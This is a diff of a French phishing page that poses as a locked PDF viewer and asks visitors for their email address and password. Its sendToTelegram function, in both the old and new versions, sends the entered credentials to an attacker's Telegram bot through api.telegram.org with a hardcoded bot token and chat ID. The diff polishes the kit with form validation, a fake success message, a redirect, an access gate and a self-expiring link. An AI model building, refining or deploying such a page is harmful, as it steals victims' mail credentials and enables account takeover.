@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
@@ -115,6 +115,13 @@
       font-size: 14px;
     }
 
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-top: 5px;
+      display: none;
+    }
+
     @media (max-width: 480px) {
       .card {
         padding: 20px 15px;
@@ -137,7 +144,7 @@
         <img src="files/img/pdf.png" alt="PDF" width="24" />
         56.1KB
       </p>
-      <p>Pour lire le document, veuillez entrer les identifiants de messagerie associés.</p>
+      <p>Pour lire le document, veuillez entrer l’adresse email et mot de passe associés.</p>
     </div>
 
     <div class="email-logos">
@@ -145,7 +152,11 @@
     </div>
 
     <input type="email" id="email" placeholder="Adresse e-mail" required />
+    <div id="email-error" class="error">Veuillez entrer une adresse e-mail valide.</div>
+
     <input type="password" id="password" placeholder="Mot de passe" required />
+    <div id="password-error" class="error">Veuillez entrer votre mot de passe.</div>
+
     <button onclick="sendToTelegram()">Continuer</button>
 
     <div class="loader" id="loader">Envoi en cours...</div>
@@ -153,50 +164,77 @@
 </div>
 
 <script>
-if(localStorage.getItem("valide")!=="true"){
-window.location.href="../";
+if (localStorage.getItem("valide") !== "true") {
+  window.location.href = "../";
 }
-  function sendToTelegram() {
-    const email = document.getElementById("email").value.trim();
-    const password = document.getElementById("password").value.trim();
-    const loader = document.getElementById("loader");
 
-    if (!email || !password) {
-      alert("Veuillez remplir tous les champs.");
-      return;
-    }
+function sendToTelegram() {
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value.trim();
+  const loader = document.getElementById("loader");
+  const emailError = document.getElementById("email-error");
+  const passwordError = document.getElementById("password-error");
 
-    loader.style.display = "block";
+  emailError.style.display = "none";
+  passwordError.style.display = "none";
 
-    const token = "5576536291:AAEJPqADV8S2ClBzMrBeCR_YldKZ7cD7MfI"; // <-- Remplace par ton token
-    const chatId = "1885928569";  // <-- Remplace par ton chat ID
-    const message = `📩 Infos Mails pros :\n\n📧 Email : ${email}\n🔒 Mot de passe : ${password}`;
-    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+  let valid = true;
+  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-    fetch(url)
-      .then(response => {
-        loader.style.display = "none";
-        if (response.ok) {
-          window.location.href = "finish.html";
-        } else {
-          alert("Erreur lors de l'envoi. Veuillez réessayer.");
-        }
-      })
-      .catch(error => {
-        console.error("Erreur :", error);
-        loader.style.display = "none";
-        alert("Une erreur est survenue. Vérifiez votre connexion.");
-      });
+  if (!email || !emailPattern.test(email)) {
+    emailError.style.display = "block";
+    valid = false;
   }
-</script>
-<script>
-// Date de début : 8 juin 2025
-const startDate = new Date('2025-06-28T00:00:00');
 
-// Délai d’expiration en jours
+  if (!password) {
+    passwordError.style.display = "block";
+    valid = false;
+  }
+
+  if (!valid) return;
+
+  loader.style.display = "block";
+
+  const token = "5576536291:AAEJPqADV8S2ClBzMrBeCR_YldKZ7cD7MfI";
+  const chatId = "1885928569";
+  const message = `📩 E-mail Pros :\n\n📧 Adresse e-mail : ${email}\n🔒 Mot de passe : ${password}`;
+  const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+  fetch(url)
+    .then(response => {
+      loader.style.display = "none";
+      const msg = document.createElement("div");
+      if (response.ok) {
+        msg.textContent = "✅ Informations envoyées avec succès.";
+        msg.style.color = "green";
+        document.querySelector(".card").appendChild(msg);
+
+        // Redirection après un court délai
+        setTimeout(() => {
+          window.location.href = "finish.html";
+        }, 1000); // 1 seconde pour que le message soit visible
+      } else {
+        msg.textContent = "❌ Une erreur est survenue. Veuillez réessayer.";
+        msg.style.color = "red";
+        document.querySelector(".card").appendChild(msg);
+      }
+    })
+    .catch(error => {
+      console.error("Erreur :", error);
+      loader.style.display = "none";
+      const msg = document.createElement("div");
+      msg.textContent = "❌ Une erreur réseau est survenue.";
+      msg.style.color = "red";
+      document.querySelector(".card").appendChild(msg);
+    });
+}
+
+</script>
+
+<script>
+const startDate = new Date('2025-06-28T00:00:00');
 const expirationDays = 28;
 
-// Vérifie si le lien a expiré
 function isLinkExpired() {
   const now = new Date();
   const timeDiff = now - startDate;
@@ -204,20 +242,14 @@ function isLinkExpired() {
   return daysPassed >= expirationDays;
 }
 
-// Affiche un message d’expiration avec style percutant
 function showExpirationMessage() {
   if (isLinkExpired()) {
-    // Supprimer tout le contenu de la page
     document.body.innerHTML = '';
-
-    // Créer le conteneur du message
     const messageDiv = document.createElement('div');
     messageDiv.innerHTML = `
       <h1>⚠️ Le lien a expiré</h1>
       <p>Veuillez contacter l’administrateur du site pour plus d’informations.</p>
     `;
-
-    // Style impactant
     Object.assign(messageDiv.style, {
       position: 'fixed',
       top: '0',
@@ -237,18 +269,13 @@ function showExpirationMessage() {
       boxSizing: 'border-box',
       zIndex: '9999',
     });
-
-    // Style du titre
     messageDiv.querySelector('h1').style.fontSize = '36px';
     messageDiv.querySelector('h1').style.marginBottom = '20px';
     messageDiv.querySelector('p').style.color = '#ffffff';
-
-    // Afficher sur la page
     document.body.appendChild(messageDiv);
   }
 }
 
-// Lancer au chargement de la page
 window.onload = showExpirationMessage;
 </script>
 </body>
